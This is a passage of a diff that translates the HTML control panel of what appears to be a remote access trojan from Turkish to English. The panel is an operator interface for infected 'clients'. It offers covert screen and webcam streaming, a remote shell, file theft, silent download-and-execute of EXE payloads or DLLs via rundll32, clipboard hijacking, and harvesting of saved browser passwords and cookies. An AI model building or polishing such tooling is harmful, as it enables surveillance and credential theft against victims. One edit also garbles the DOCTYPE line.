@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!□TYPE html>
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
@@ -9,7 +9,7 @@
 <body>
     <div class="layout">
 
-        <!-- ─── Sol Sidebar ─── -->
+        <!-- - Sol Sidebar - -->
         <aside class="sidebar" id="sidebar">
             <div class="sidebar-logo">
                 <span class="logo-icon">◈</span>
@@ -18,11 +18,11 @@
 
             <nav class="sidebar-nav">
                 <button class="nav-item active" onclick="switchPage('home')" id="nav-home">
-                    <span class="nav-icon">⌂</span>
+                    <span class="nav-icon">Home</span>
                     <span class="nav-label">Home</span>
                 </button>
                 <button class="nav-item" onclick="switchPage('clients')" id="nav-clients">
-                    <span class="nav-icon">◉</span>
+                    <span class="nav-icon">◎</span>
                     <span class="nav-label">Clients</span>
                     <span class="nav-badge" id="nav-badge">0</span>
                 </button>
@@ -43,38 +43,38 @@
             <div class="sidebar-bottom">
                 <a href="/logout" class="logout-item">
                     <span class="nav-icon">⏻</span>
-                    <span class="nav-label">Çıkış</span>
+                    <span class="nav-label">Logout</span>
                 </a>
             </div>
         </aside>
 
-        <!-- ─── Mobil Header ─── -->
+        <!-- - Mobil Header - -->
         <div class="mobile-header">
             <button class="hamburger" onclick="toggleSidebar()" id="hamburger">☰</button>
             <span class="mobile-title" id="mobile-title">Home</span>
             <a href="/logout" class="mobile-logout">⏻</a>
         </div>
 
-        <!-- ─── Sidebar Overlay (mobil) ─── -->
+        <!-- - Sidebar Overlay (mobil) - -->
         <div class="sidebar-overlay" id="sidebar-overlay" onclick="closeSidebar()"></div>
 
-        <!-- ─── Ana İçerik ─── -->
+        <!-- - Main Content - -->
         <main class="main-content">
 
             <!-- ══════════ HOME ══════════ -->
             <div class="page" id="page-home">
                 <div class="page-header">
                     <h2>Home</h2>
-                    <span class="page-sub">Sistem durumu ve genel bakış</span>
+                    <span class="page-sub">System status and overview</span>
                 </div>
 
-                <!-- Stat kartları -->
+                <!-- Stat cards -->
                 <div class="stat-grid">
                     <div class="stat-card accent-blue">
                         <div class="stat-icon">◉</div>
                         <div class="stat-info">
                             <div class="stat-value" id="stat-clients">0</div>
-                            <div class="stat-label">Aktif Client</div>
+                            <div class="stat-label">Active Clients</div>
                         </div>
                     </div>
                     <div class="stat-card accent-green">
@@ -95,7 +95,7 @@
                         <div class="stat-icon">▣</div>
                         <div class="stat-info">
                             <div class="stat-value" id="stat-mem">0 MB</div>
-                            <div class="stat-label">RAM Kullanımı</div>
+                            <div class="stat-label">RAM Usage</div>
                         </div>
                     </div>
                 </div>
@@ -103,52 +103,52 @@
                 <!-- Server bilgileri -->
                 <div class="info-grid">
                     <div class="info-card">
-                        <div class="info-card-title">Server Bilgileri</div>
+                        <div class="info-card-title">Server Information</div>
                         <div class="info-rows">
                             <div class="info-row">
-                                <span class="info-key">İşletim Sistemi</span>
-                                <span class="info-val mono" id="info-os">—</span>
+                                <span class="info-key">Operating System</span>
+                                <span class="info-val mono" id="info-os">-</span>
                             </div>
                             <div class="info-row">
-                                <span class="info-key">Mimari</span>
-                                <span class="info-val mono" id="info-arch">—</span>
+                                <span class="info-key">Architecture</span>
+                                <span class="info-val mono" id="info-arch">-</span>
                             </div>
                             <div class="info-row">
-                                <span class="info-key">Go Versiyonu</span>
-                                <span class="info-val mono" id="info-go">—</span>
+                                <span class="info-key">Go Version</span>
+                                <span class="info-val mono" id="info-go">-</span>
                             </div>
                         </div>
                     </div>
 
                     <div class="info-card">
-                        <div class="info-card-title">Ağ Bilgileri</div>
+                        <div class="info-card-title">Network Information</div>
                         <div class="info-rows">
                             <div class="info-row">
                                 <span class="info-key">HTTP Port</span>
-                                <span class="info-val mono" id="info-http">—</span>
+                                <span class="info-val mono" id="info-http">-</span>
                             </div>
                             <div class="info-row">
                                 <span class="info-key">TCP Port</span>
-                                <span class="info-val mono" id="info-tcp">—</span>
+                                <span class="info-val mono" id="info-tcp">-</span>
                             </div>
                             <div class="info-row">
-                                <span class="info-key">Durum</span>
+                                <span class="info-key">Status</span>
                                 <span class="info-val">
-                                    <span class="status-dot"></span> Çalışıyor
+                                    <span class="status-dot"></span> Running
                                 </span>
                             </div>
                         </div>
                     </div>
                 </div>
 
-                <!-- Bağlı clientler mini liste -->
+                <!-- Connected clients mini list -->
                 <div class="info-card" style="margin-top:16px;">
                     <div class="info-card-title" style="display:flex;justify-content:space-between;align-items:center;">
-                        <span>Son Bağlanan Clientler</span>
-                        <button class="mini-btn" onclick="switchPage('clients')">Tümünü Gör →</button>
+                        <span>Recently Connected Clients</span>
+                        <button class="mini-btn" onclick="switchPage('clients')">See All →</button>
                     </div>
                     <div id="home-client-list" class="home-client-list">
-                        <div class="empty-mini">Henüz bağlı client yok.</div>
+                        <div class="empty-mini">No clients connected yet.</div>
                     </div>
                 </div>
             </div>
@@ -156,7 +156,7 @@
             <!-- ══════════ CLIENTS ══════════ -->
             <div class="page" id="page-clients" style="display:none;">
                 <div class="clients-layout">
-                    <!-- Sol: Liste -->
+                    <!-- Left: List -->
                     <div class="client-panel" id="client-panel">
                         <div class="section-header">
                             <h2>Clients</h2>
@@ -185,21 +185,21 @@
                                 </div>
                                 {{end}}
                             {{else}}
-                                <div class="empty">Henüz bağlı client yok.</div>
+                                <div class="empty">No clients connected yet.</div>
                             {{end}}
                         </div>
                     </div>
 
-                    <!-- Sağ: Detay -->
+                    <!-- Right: Detail -->
                     <div class="detail-panel" id="detail-panel">
                         <div class="detail-empty" id="detail-empty">
                             <span>←</span>
-                            <p>Bir client seçin</p>
+                            <p>Select a client</p>
                         </div>
 
                         <div class="detail-content" id="detail-content" style="display:none;">
                             <div class="detail-header">
-                                <button class="back-btn" id="back-btn" onclick="closeDetail()">‹ Geri</button>
+                                <button class="back-btn" id="back-btn" onclick="closeDetail()">‹ Back</button>
                                 <div class="detail-info">
                                     <div class="detail-top">
                                         <div class="detail-ip" id="detail-ip"></div>
@@ -272,8 +272,8 @@
                                 <div class="action-card">
                                     <div class="action-title">Send Message</div>
                                     <div class="action-body">
-                                        <input type="text" id="msg-input" placeholder="Mesajınızı girin..." />
-                                        <button class="send-btn" onclick="sendMessage()">Gönder</button>
+                                        <input type="text" id="msg-input" placeholder="Enter your message..." />
+                                        <button class="send-btn" onclick="sendMessage()">Send</button>
                                     </div>
                                     <div class="action-status" id="msg-status"></div>
                                 </div>
@@ -284,7 +284,7 @@
                                 <div class="screen-wrapper">
                                     <div class="screen-toolbar">
                                         <div class="screen-info">
-                                            <span class="screen-status-label" id="screen-status-label">Durduruldu</span>
+                                            <span class="screen-status-label" id="screen-status-label">Stopped</span>
                                         </div>
                                         <div class="screen-fps-control">
                                             <span class="fps-label">FPS</span>
@@ -294,14 +294,14 @@
                                             <span class="fps-value" id="fps-value">10</span>
                                         </div>
                                         <div class="screen-controls">
-                                            <button class="screen-start-btn" id="screen-start-btn" onclick="screenStart()">▶ Başlat</button>
-                                            <button class="screen-stop-btn" id="screen-stop-btn" onclick="screenStop()" style="display:none;">■ Durdur</button>
+                                            <button class="screen-start-btn" id="screen-start-btn" onclick="screenStart()">▶ Start</button>
+                                            <button class="screen-stop-btn" id="screen-stop-btn" onclick="screenStop()" style="display:none;">■ Stop</button>
                                         </div>
                                     </div>
                                     <div class="screen-view" id="screen-view">
                                         <div class="screen-placeholder" id="screen-placeholder">
                                             <span class="screen-placeholder-icon">▣</span>
-                                            <span>Yayın başlatmak için ▶ Başlat'a basın</span>
+                                            <span>Press ▶ Start to begin streaming</span>
                                         </div>
                                         <img id="screen-img" class="screen-img" src="" alt="" style="display:none;" />
                                     </div>
@@ -313,7 +313,7 @@
                                 <div class="screen-wrapper">
                                     <div class="screen-toolbar">
                                         <div class="screen-info">
-                                            <span class="screen-status-label" id="cam-status-label">Durduruldu</span>
+                                            <span class="screen-status-label" id="cam-status-label">Stopped</span>
                                         </div>
                                         <div class="screen-fps-control">
                                             <span class="fps-label">FPS</span>
@@ -323,14 +323,14 @@
                                             <span class="fps-value" id="cam-fps-value">10</span>
                                         </div>
                                         <div class="screen-controls">
-                                            <button class="screen-start-btn cam-start-btn" id="cam-start-btn" onclick="camStart()">▶ Başlat</button>
-                                            <button class="screen-stop-btn" id="cam-stop-btn" onclick="camStop()" style="display:none;">■ Durdur</button>
+                                            <button class="screen-start-btn cam-start-btn" id="cam-start-btn" onclick="camStart()">▶ Start</button>
+                                            <button class="screen-stop-btn" id="cam-stop-btn" onclick="camStop()" style="display:none;">■ Stop</button>
                                         </div>
                                     </div>
                                     <div class="screen-view" id="cam-view">
                                         <div class="screen-placeholder" id="cam-placeholder">
                                             <span class="screen-placeholder-icon">◉</span>
-                                            <span>Kamerayı başlatmak için ▶ Başlat'a basın</span>
+                                            <span>Press ▶ Start to begin camera</span>
                                         </div>
                                         <img id="cam-img" class="screen-img" src="" alt="" style="display:none;" />
                                     </div>
@@ -342,17 +342,17 @@
                                 <div class="terminal-wrapper">
                                     <div class="terminal-titlebar">
                                         <span class="terminal-type-label" id="terminal-label">CMD</span>
-                                        <button class="clear-btn" onclick="clearTerminal()">Temizle</button>
+                                        <button class="clear-btn" onclick="clearTerminal()">Clear</button>
                                     </div>
                                     <div class="terminal-output" id="terminal-output"></div>
-                                    <div class="terminal-resize-handle" id="terminal-resize-handle" title="Sürükleyerek boyutlandır">
+                                    <div class="terminal-resize-handle" id="terminal-resize-handle" title="Drag to resize">
                                         <span>⠿</span>
                                     </div>
-                                    <!-- Masaüstü input -->
+                                    <!-- Desktop input -->
                                     <div class="terminal-input-row" id="terminal-input-row">
                                         <span class="prompt" id="term-prompt">C:\&gt;</span>
                                         <input type="text" id="shell-input" class="terminal-input"
-                                               placeholder="komut girin..." autocomplete="off" spellcheck="false"
+                                               placeholder="enter command..." autocomplete="off" spellcheck="false"
                                                inputmode="none" />
                                         <button class="term-send-btn" onclick="sendShellCommand()">↵</button>
                                     </div>
@@ -360,7 +360,7 @@
                                     <div class="mobile-keyboard" id="mobile-keyboard" style="display:none;">
                                         <div class="mkb-input-row">
                                             <input type="text" id="mobile-shell-input" class="mkb-input"
-                                                   placeholder="komut girin..." autocomplete="off" spellcheck="false" />
+                                                   placeholder="enter command..." autocomplete="off" spellcheck="false" />
                                             <button class="mkb-send-btn" onclick="sendMobileShellCommand()">↵</button>
                                         </div>
                                     </div>
@@ -372,26 +372,26 @@
                                 <div class="taskmgr-wrapper">
                                     <div class="taskmgr-toolbar">
                                         <div class="taskmgr-info">
-                                            <span class="taskmgr-count" id="task-count">— process</span>
+                                            <span class="taskmgr-count" id="task-count">- processes</span>
                                         </div>
                                         <div class="taskmgr-search-wrap">
                                             <input type="text" id="task-search" class="taskmgr-search"
-                                                   placeholder="Process ara..." oninput="filterTasks()" autocomplete="off" />
+                                                   placeholder="Search process..." oninput="filterTasks()" autocomplete="off" />
                                         </div>
                                         <button class="taskmgr-refresh-btn" id="task-refresh-btn" onclick="loadTasks()">
-                                            ↻ Yenile
+                                            ↻ Refresh
                                         </button>
                                     </div>
                                     <div class="taskmgr-table-wrap" id="taskmgr-table-wrap">
                                         <div class="taskmgr-empty" id="task-empty">
                                             <span class="taskmgr-empty-icon">⚡</span>
-                                            <span>Yüklemek için ↻ Yenile'ye basın</span>
+                                            <span>Press ↻ Refresh to load</span>
                                         </div>
                                         <table class="taskmgr-table" id="taskmgr-table" style="display:none;">
                                             <thead>
                                                 <tr>
                                                     <th class="col-pid" onclick="sortTasks('pid')">PID <span class="sort-arrow" id="sort-pid"></span></th>
-                                                    <th class="col-name" onclick="sortTasks('name')">Process Adı <span class="sort-arrow" id="sort-name"></span></th>
+                                                    <th class="col-name" onclick="sortTasks('name')">Process Name <span class="sort-arrow" id="sort-name"></span></th>
                                                     <th class="col-cpu" onclick="sortTasks('cpu')">CPU % <span class="sort-arrow" id="sort-cpu"></span></th>
                                                     <th class="col-mem" onclick="sortTasks('mem')">RAM (MB) <span class="sort-arrow" id="sort-mem"></span></th>
                                                     <th class="col-kill"></th>
@@ -409,13 +409,13 @@
                                 <div class="fb-wrapper">
                                     <!-- Toolbar -->
                                     <div class="fb-toolbar">
-                                        <button class="fb-btn fb-back-btn" id="fb-back-btn" onclick="fbGoBack()" title="Geri" disabled>‹</button>
-                                        <button class="fb-btn fb-up-btn"   id="fb-up-btn"   onclick="fbGoUp()"   title="Üst Dizin" disabled>↑</button>
+                                        <button class="fb-btn fb-back-btn" id="fb-back-btn" onclick="fbGoBack()" title="Back" disabled>‹</button>
+                                        <button class="fb-btn fb-up-btn"   id="fb-up-btn"   onclick="fbGoUp()"   title="Parent Directory" disabled>↑</button>
                                         <div class="fb-breadcrumb" id="fb-breadcrumb"></div>
-                                        <button class="fb-btn fb-refresh-btn" onclick="fbRefresh()" title="Yenile">↻</button>
-                                        <button class="fb-btn fb-mkdir-btn"   onclick="fbMkdirPrompt()" title="Yeni Klasör">+ Klasör</button>
-                                        <label  class="fb-btn fb-upload-btn"  title="Dosya Yükle">
-                                            ↑ Yükle
+                                        <button class="fb-btn fb-refresh-btn" onclick="fbRefresh()" title="Refresh">↻</button>
+                                        <button class="fb-btn fb-mkdir-btn"   onclick="fbMkdirPrompt()" title="New Folder">+ Folder</button>
+                                        <label  class="fb-btn fb-upload-btn"  title="Upload Files">
+                                            ↑ Upload
                                             <input type="file" id="fb-upload-input" multiple style="display:none;" onchange="fbUploadFiles(this)" />
                                         </label>
                                     </div>
@@ -423,15 +423,15 @@
                                     <div class="fb-list-wrap" id="fb-list-wrap">
                                         <div class="fb-empty" id="fb-empty">
                                             <span class="fb-empty-icon">◫</span>
-                                            <span>Dizin seçilmedi</span>
+                                            <span>No directory selected</span>
                                         </div>
                                         <table class="fb-table" id="fb-table" style="display:none;">
                                             <thead>
                                                 <tr>
                                                     <th class="fb-col-icon"></th>
-                                                    <th class="fb-col-name"  onclick="fbSort('name')">Ad <span class="sort-arrow" id="fb-sort-name"></span></th>
-                                                    <th class="fb-col-size"  onclick="fbSort('size')">Boyut <span class="sort-arrow" id="fb-sort-size"></span></th>
-                                                    <th class="fb-col-mtime" onclick="fbSort('mtime')">Tarih <span class="sort-arrow" id="fb-sort-mtime"></span></th>
+                                                    <th class="fb-col-name"  onclick="fbSort('name')">Name <span class="sort-arrow" id="fb-sort-name"></span></th>
+                                                    <th class="fb-col-size"  onclick="fbSort('size')">Size <span class="sort-arrow" id="fb-sort-size"></span></th>
+                                                    <th class="fb-col-mtime" onclick="fbSort('mtime')">Date <span class="sort-arrow" id="fb-sort-mtime"></span></th>
                                                     <th class="fb-col-act"></th>
                                                 </tr>
                                             </thead>
@@ -443,11 +443,11 @@
                                 </div>
                                 <!-- Context Menu -->
                                 <div class="fb-ctx-menu" id="fb-ctx-menu">
-                                    <button id="fb-ctx-btn-open"     onclick="fbCtxOpen()">↳ Aç / Gir</button>
-                                    <button id="fb-ctx-btn-download" onclick="fbCtxDownload()">↓ İndir</button>
-                                    <button onclick="fbCtxRename()">✎ Yeniden Adlandır</button>
+                                    <button id="fb-ctx-btn-open"     onclick="fbCtxOpen()">↳ Open / Enter</button>
+                                    <button id="fb-ctx-btn-download" onclick="fbCtxDownload()">↓ Download</button>
+                                    <button onclick="fbCtxRename()">✎ Rename</button>
                                     <div class="fb-ctx-sep"></div>
-                                    <button class="danger" onclick="fbCtxDelete()">✕ Sil</button>
+                                    <button class="danger" onclick="fbCtxDelete()">✕ Delete</button>
                                 </div>
                             </div>
                             <!-- Remote File Execution -->
@@ -457,7 +457,7 @@
                                     <div class="rfe-toolbar">
                                         <span class="rfe-toolbar-title">Remote File Execution</span>
                                         <div class="rfe-type-toggle">
-                                            <button class="rfe-type-btn active" id="rfe-btn-exe" onclick="rfeSetType('exe')">EXE</button>
+                                            <button class="rfe-type-btn active" id="rfe-btn-exe" onclick="rfeSetType('exe')">⚙</button>
                                             <button class="rfe-type-btn" id="rfe-btn-dll" onclick="rfeSetType('dll')">DLL</button>
                                         </div>
                                     </div>
@@ -468,41 +468,41 @@
                                         <div class="rfe-card">
                                             <div class="rfe-card-head">
                                                 <span class="rfe-card-icon">◈</span>
-                                                <span class="rfe-card-title" id="rfe-card-title">Execute EXE</span>
+                                                <span class="rfe-card-title" id="rfe-card-title">Execute ⚙</span>
                                             </div>
                                             <div class="rfe-card-body">
                                                 <!-- URL -->
                                                 <div class="rfe-row">
-                                                    <label class="rfe-label">Dosya URL</label>
+                                                    <label class="rfe-label">File URL</label>
                                                     <div class="rfe-input-wrap">
                                                         <span class="rfe-prefix" id="rfe-prefix">http://</span>
                                                         <input type="text" id="rfe-url" class="rfe-input"
                                                                placeholder="example.com/payload.exe"
                                                                autocomplete="off" spellcheck="false" />
                                                     </div>
-                                                    <span class="rfe-hint">İndirilecek ve çalıştırılacak dosyanın tam URL'i</span>
+                                                    <span class="rfe-hint">Full URL of the file to be downloaded and executed</span>
                                                 </div>
 
-                                                <!-- Args (EXE only) -->
+                                                <!-- Args (⚙ only) -->
                                                 <div class="rfe-row" id="rfe-args-row">
-                                                    <label class="rfe-label">Argümanlar <span class="rfe-label-opt">(opsiyonel)</span></label>
+                                                    <label class="rfe-label">Arguments <span class="rfe-label-opt">(optional)</span></label>
                                                     <div class="rfe-input-wrap">
                                                         <span class="rfe-prefix">args</span>
                                                         <input type="text" id="rfe-args" class="rfe-input"
                                                                placeholder="/silent /install"
                                                                autocomplete="off" spellcheck="false" />
                                                     </div>
-                                                    <span class="rfe-hint">EXE'ye geçirilecek komut satırı parametreleri</span>
+                                                    <span class="rfe-hint">Command line parameters to be passed to the ⚙</span>
                                                 </div>
 
                                                 <!-- DLL Note -->
                                                 <div class="rfe-dll-note" id="rfe-dll-note" style="display:none;">
                                                     <span class="rfe-dll-note-icon">◉</span>
-                                                    <span>DLL, hedef sistemde <code>rundll32</code> aracılığıyla yüklenecek. Export fonksiyon belirtilmezse varsayılan giriş noktası kullanılır.</span>
+                                                    <span>The DLL will be loaded on the target system via <code>rundll32</code>. If no export function is specified, the default entry point is used.</span>
                                                 </div>
 
                                                 <button class="rfe-run-btn" id="rfe-run-btn" onclick="rfeExecute()">
-                                                    <span id="rfe-btn-text">▶ Çalıştır</span>
+                                                    <span id="rfe-btn-text">▶ Run</span>
                                                 </button>
                                             </div>
                                         </div>
@@ -510,8 +510,8 @@
                                         <!-- Result Card -->
                                         <div class="rfe-result-card" id="rfe-result-card" style="display:none;">
                                             <div class="rfe-result-head">
-                                                <span class="rfe-result-label">Sonuç</span>
-                                                <button class="rfe-clear-btn" onclick="rfeClear()">✕ Temizle</button>
+                                                <span class="rfe-result-label">Result</span>
+                                                <button class="rfe-clear-btn" onclick="rfeClear()">✕ Clear</button>
                                             </div>
                                             <div class="rfe-result-body" id="rfe-result-body">
                                                 <span class="rfe-result-icon" id="rfe-result-icon"></span>
@@ -521,7 +521,7 @@
                                     </div>
 
                                     <!-- Status Bar -->
-                                    <div class="rfe-statusbar" id="rfe-statusbar">Hazır</div>
+                                    <div class="rfe-statusbar" id="rfe-statusbar">Ready</div>
                                 </div>
                             </div>
 
@@ -531,49 +531,49 @@
                                     <!-- Toolbar -->
                                     <div class="rfe-toolbar">
                                         <span class="rfe-toolbar-title">Clipboard Manager</span>
-                                        <button class="mini-btn" onclick="clipboardRefresh()" id="cb-refresh-btn">↻ Yenile</button>
+                                        <button class="mini-btn" onclick="clipboardRefresh()" id="cb-refresh-btn">↻ Refresh</button>
                                     </div>
 
                                     <!-- Body -->
                                     <div class="rfe-body">
 
-                                        <!-- Mevcut içerik kartı -->
+                                        <!-- Current content card -->
                                         <div class="rfe-card" style="flex:1 1 340px;">
                                             <div class="rfe-card-head">
                                                 <span class="rfe-card-icon">◧</span>
-                                                <span class="rfe-card-title">Mevcut Clipboard İçeriği</span>
+                                                <span class="rfe-card-title">Current Clipboard Content</span>
                                             </div>
                                             <div class="rfe-card-body">
                                                 <textarea id="cb-read-area"
                                                     style="width:100%;min-height:140px;resize:vertical;background:#111;border:1px solid #333;border-radius:8px;color:#e2e2e2;padding:10px 12px;font-size:0.875rem;font-family:'Segoe UI',monospace;outline:none;"
-                                                    placeholder="Clipboard içeriği burada görünür..." readonly></textarea>
+                                                    placeholder="Clipboard content will appear here..." readonly></textarea>
                                                 <div style="display:flex;gap:8px;margin-top:10px;">
                                                     <button class="rfe-run-btn" style="flex:1;" onclick="clipboardRefresh()">
-                                                        ↻ Oku
+                                                        ↻ Read
                                                     </button>
-                                                    <button class="rfe-run-btn" style="flex:1;background:#2a2a2a;border:1px solid #444;" onclick="clipboardCopyLocal()" title="Tarayıcı panoya kopyala">
-                                                        ⧉ Kopyala
+                                                    <button class="rfe-run-btn" style="flex:1;background:#2a2a2a;border:1px solid #444;" onclick="clipboardCopyLocal()" title="Copy to local clipboard">
+                                                        ⧉ Copy
                                                     </button>
                                                 </div>
                                             </div>
                                         </div>
 
-                                        <!-- Yaz kartı -->
+                                        <!-- Write card -->
                                         <div class="rfe-card" style="flex:1 1 340px;">
                                             <div class="rfe-card-head">
                                                 <span class="rfe-card-icon">✎</span>
-                                                <span class="rfe-card-title">Clipboard'a Yaz</span>
+                                                <span class="rfe-card-title">Write to Clipboard</span>
                                             </div>
                                             <div class="rfe-card-body">
                                                 <textarea id="cb-write-area"
                                                     style="width:100%;min-height:140px;resize:vertical;background:#111;border:1px solid #333;border-radius:8px;color:#e2e2e2;padding:10px 12px;font-size:0.875rem;font-family:'Segoe UI',monospace;outline:none;transition:border .2s;"
-                                                    placeholder="Hedefe yazılacak metni girin..."></textarea>
+                                                    placeholder="Enter text to be written to the target..."></textarea>
                                                 <div style="display:flex;gap:8px;margin-top:10px;">
                                                     <button class="rfe-run-btn" style="flex:1;" onclick="clipboardWrite()">
-                                                        <span id="cb-write-btn-text">✎ Yaz</span>
+                                                        <span id="cb-write-btn-text">✎ Write</span>
                                                     </button>
                                                     <button class="rfe-run-btn" style="flex:1;background:#2a2a2a;border:1px solid #444;" onclick="document.getElementById('cb-write-area').value=''">
-                                                        ✕ Temizle
+                                                        ✕ Clear
                                                     </button>
                                                 </div>
                                             </div>
@@ -582,7 +582,7 @@
                                     </div>
 
                                     <!-- Status Bar -->
-                                    <div class="rfe-statusbar" id="cb-statusbar">Hazır</div>
+                                    <div class="rfe-statusbar" id="cb-statusbar">Ready</div>
                                 </div>
                             </div>
 
@@ -597,7 +597,7 @@
                                             <span class="cs-btn-icon">✕</span>
                                             <div class="cs-btn-content">
                                                 <span class="cs-btn-label">Uninstall Client</span>
-                                                <span class="cs-btn-desc">Client'ı kalıcı olarak kaldır</span>
+                                                <span class="cs-btn-desc">Permanently uninstall client</span>
                                             </div>
                                         </button>
 
@@ -605,7 +605,7 @@
                                             <span class="cs-btn-icon">⏻</span>
                                             <div class="cs-btn-content">
                                                 <span class="cs-btn-label">Close Client</span>
-                                                <span class="cs-btn-desc">Client sürecini kapat</span>
+                                                <span class="cs-btn-desc">Close client process</span>
                                             </div>
                                         </button>
 
@@ -613,7 +613,7 @@
                                             <span class="cs-btn-icon">↻</span>
                                             <div class="cs-btn-content">
                                                 <span class="cs-btn-label">Reconnect Client</span>
-                                                <span class="cs-btn-desc">Bağlantıyı yeniden kur</span>
+                                                <span class="cs-btn-desc">Re-establish connection</span>
                                             </div>
                                         </button>
 
@@ -632,69 +632,70 @@
                                             <label class="settings-label">Reconnect Delay (ms)</label>
                                             <div class="settings-input-row">
                                                 <input type="number" id="cs-delay-input" class="settings-input" placeholder="5000" min="1000" />
-                                                <button class="settings-save-btn" onclick="setClientDelay()">Uygula</button>
+                                                <button class="settings-save-btn" onclick="setClientDelay()">Apply</button>
                                             </div>
                                         </div>
-                                        <button class="settings-save-btn" style="width: 100%; margin-top: 10px;" onclick="saveClientSettings()">Kimlik Bilgilerini Kaydet</button>
+                                        <button class="settings-save-btn" style="width: 100%; margin-top: 10px;" onclick="saveClientSettings()">Save Identity Info</button>
                                     </div>
 
                                     <!-- Sağ: Sistem Bilgileri -->
+                                    <!-- Right: System Information -->
                                     <div class="cs-info-panel">
                                         <div class="cs-info-title">System Information</div>
                                         <div class="cs-info-rows">
                                             <div class="cs-info-row">
                                                 <span class="cs-info-key">Desktop Name</span>
-                                                <span class="cs-info-val mono" id="cs-desktop">—</span>
+                                                <span class="cs-info-val mono" id="cs-desktop">-</span>
                                             </div>
                                             <div class="cs-info-row">
                                                 <span class="cs-info-key">IP Address</span>
-                                                <span class="cs-info-val mono" id="cs-ip">—</span>
+                                                <span class="cs-info-val mono" id="cs-ip">-</span>
                                             </div>
                                             <div class="cs-info-row">
                                                 <span class="cs-info-key">Country</span>
-                                                <span class="cs-info-val" id="cs-country">—</span>
+                                                <span class="cs-info-val" id="cs-country">-</span>
                                             </div>
                                             <div class="cs-info-row">
                                                 <span class="cs-info-key">Anti Virus</span>
-                                                <span class="cs-info-val" id="cs-av">—</span>
+                                                <span class="cs-info-val" id="cs-av">-</span>
                                             </div>
                                             <div class="cs-info-row">
                                                 <span class="cs-info-key">Client ID</span>
-                                                <span class="cs-info-val mono" id="cs-id">—</span>
+                                                <span class="cs-info-val mono" id="cs-id">-</span>
                                             </div>
                                             <div class="cs-info-sep"></div>
                                             <div class="cs-info-row">
                                                 <span class="cs-info-key">GPU</span>
-                                                <span class="cs-info-val" id="cs-gpu">—</span>
+                                                <span class="cs-info-val" id="cs-gpu">-</span>
                                             </div>
                                             <div class="cs-info-row">
                                                 <span class="cs-info-key">CPU</span>
-                                                <span class="cs-info-val" id="cs-cpu">—</span>
+                                                <span class="cs-info-val" id="cs-cpu">-</span>
                                             </div>
                                             <div class="cs-info-row">
                                                 <span class="cs-info-key">RAM</span>
-                                                <span class="cs-info-val" id="cs-ram">—</span>
+                                                <span class="cs-info-val" id="cs-ram">-</span>
                                             </div>
                                             <div class="cs-info-row">
                                                 <span class="cs-info-key">Disk</span>
-                                                <span class="cs-info-val" id="cs-disk">—</span>
+                                                <span class="cs-info-val" id="cs-disk">-</span>
                                             </div>
                                             <div class="cs-info-row">
-                                                <span class="cs-info-key">İşletim Sistemi</span>
-                                                <span class="cs-info-val" id="cs-os">—</span>
+                                                <span class="cs-info-key">Operating System</span>
+                                                <span class="cs-info-val" id="cs-os">-</span>
                                             </div>
                                             <div class="cs-info-row">
-                                                <span class="cs-info-key">OS Sürümü</span>
-                                                <span class="cs-info-val mono" id="cs-osver">—</span>
+                                                <span class="cs-info-key">OS Version</span>
+                                                <span class="cs-info-val mono" id="cs-osver">-</span>
                                             </div>
                                             <div class="cs-info-sep"></div>
                                             <div class="cs-info-row">
-                                                <span class="cs-info-key">Process Adı</span>
-                                                <span class="cs-info-val mono" id="cs-process">—</span>
+                                                <span class="cs-info-key">Process Name</span>
+                                                <span class="cs-info-val mono" id="cs-process">-</span>
                                             </div>
                                             <div class="cs-info-row">
-                                                <span class="cs-info-key">Bağlantı Zamanı</span>
-                                                <span class="cs-info-val mono" id="cs-time">—</span>
+                                                <span class="cs-info-key">Connection Time</span>
+                                                <span class="cs-info-val mono" id="cs-time">-</span>
                                             </div>
                                         </div>
                                     </div>
@@ -716,24 +717,24 @@
                                             </div>
                                             <div class="browser-stat-rows">
                                                 <div class="browser-stat-row">
-                                                    <span class="browser-stat-key">Kayıtlı Şifreler:</span>
-                                                    <span class="browser-stat-val" id="edge-passwords">—</span>
+                                                    <span class="browser-stat-key">Saved Passwords:</span>
+                                                    <span class="browser-stat-val" id="edge-passwords">-</span>
                                                 </div>
                                                 <div class="browser-stat-row">
-                                                    <span class="browser-stat-key">Kayıtlı Çerezler:</span>
-                                                    <span class="browser-stat-val" id="edge-cookies">—</span>
+                                                    <span class="browser-stat-key">Saved Cookies:</span>
+                                                    <span class="browser-stat-val" id="edge-cookies">-</span>
                                                 </div>
                                                 <div class="browser-stat-row">
-                                                    <span class="browser-stat-key">Kayıtlı Geçmiş:</span>
-                                                    <span class="browser-stat-val" id="edge-history">—</span>
+                                                    <span class="browser-stat-key">Saved History:</span>
+                                                    <span class="browser-stat-val" id="edge-history">-</span>
                                                 </div>
                                                 <div class="browser-stat-row">
-                                                    <span class="browser-stat-key">Kayıtlı Autofill:</span>
-                                                    <span class="browser-stat-val" id="edge-autofill">—</span>
+                                                    <span class="browser-stat-key">Saved Autofill:</span>
+                                                    <span class="browser-stat-val" id="edge-autofill">-</span>
                                                 </div>
                                             </div>
                                             <div class="browser-stat-footer">
-                                                <button class="collect-data-btn" id="collect-btn-edge" onclick="collectBrowserData('edge')">⬇ Collect Data</button>
+                                                <button class="collect-data-btn" id="collect-btn-edge" onclick="collectBrowserData('edge')">↓ Collect Data</button>
                                                 <span class="collect-status" id="collect-status-edge"></span>
                                             </div>
                                         </div>
@@ -745,24 +746,24 @@
                                             </div>
                                             <div class="browser-stat-rows">
                                                 <div class="browser-stat-row">
-                                                    <span class="browser-stat-key">Kayıtlı Şifreler:</span>
-                                                    <span class="browser-stat-val" id="chrome-passwords">—</span>
+                                                    <span class="browser-stat-key">Saved Passwords:</span>
+                                                    <span class="browser-stat-val" id="chrome-passwords">-</span>
                                                 </div>
                                                 <div class="browser-stat-row">
-                                                    <span class="browser-stat-key">Kayıtlı Çerezler:</span>
-                                                    <span class="browser-stat-val" id="chrome-cookies">—</span>
+                                                    <span class="browser-stat-key">Saved Cookies:</span>
+                                                    <span class="browser-stat-val" id="chrome-cookies">-</span>
                                                 </div>
                                                 <div class="browser-stat-row">
-                                                    <span class="browser-stat-key">Kayıtlı Geçmiş:</span>
-                                                    <span class="browser-stat-val" id="chrome-history">—</span>
+                                                    <span class="browser-stat-key">Saved History:</span>
+                                                    <span class="browser-stat-val" id="chrome-history">-</span>
                                                 </div>
                                                 <div class="browser-stat-row">
-                                                    <span class="browser-stat-key">Kayıtlı Autofill:</span>
-                                                    <span class="browser-stat-val" id="chrome-autofill">—</span>
